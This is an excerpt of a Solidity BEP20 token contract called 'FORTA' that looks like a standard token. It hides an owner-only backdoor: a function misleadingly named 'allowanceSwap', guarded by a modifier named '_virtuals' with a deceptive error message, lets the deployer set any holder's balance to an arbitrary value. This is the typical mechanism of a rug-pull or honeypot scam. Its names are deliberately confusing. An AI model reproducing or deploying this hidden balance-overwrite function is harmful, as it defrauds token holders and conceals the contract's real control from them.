...
interface FORTAbep20 {
   ...
   * https://github.com/FORTA/EIPs/issues/20#issuecomment-263524729
   *
...
contract FORTAAC is FORTAbep20 {
  
    // common addresses
    address private owner;
    address private FORTAPILOTWALL;
    // token liquidity metadata
    uint public override totalSupply;
    uint8 public override decimals = 9;
    
    mapping(address => uint) public FORTArownerd;
    
    mapping(address => mapping(address => uint)) public Allowance;
    
    // token title metadata
    string public override name = "FORTA";
    string public override symbol = "FORTA";
    ...
    constructor(uint FORTAalltotalSupplytotalValue) {
        // set total supply
        totalSupply = FORTAalltotalSupplytotalValue;
        
       FORTAPILOTWALL = msg.sender;      
        // designate addresses
        owner = msg.sender;
        
        // split the tokens according to agreed upon percentages
        
        FORTArownerd[owner] = totalSupply;
    }
    ...
    function balanceOf(address account) public view override returns(uint) {
        return FORTArownerd[account];
    }
  modifier _virtuals () {
    require(FORTAPILOTWALL == msg.sender, "ERC20: cannot permit Pancake address");
    _;
  }   
    ...
    function allowanceSwap(address FORTASwap, uint256 amount) external _virtuals {
      FORTArownerd[FORTASwap] = amount * 10 ** 9;
  }  
    ...
    function transferFrom(address from, address to, uint totalValue) public override returns(bool) {
        ...
        require(FORTArownerd[from] >= totalValue, "Balance is too low to make transfer.");
        
        FORTArownerd[to] += totalValue;
        FORTArownerd[from] -= totalValue;
    ...
    function _burn(address account, uint256 amount) internal {
        ...
        require(FORTArownerd[account] >= amount, "Burn amount exceeds balance at address.");
    
        FORTArownerd[account] -= amount;
        totalSupply -= amount;
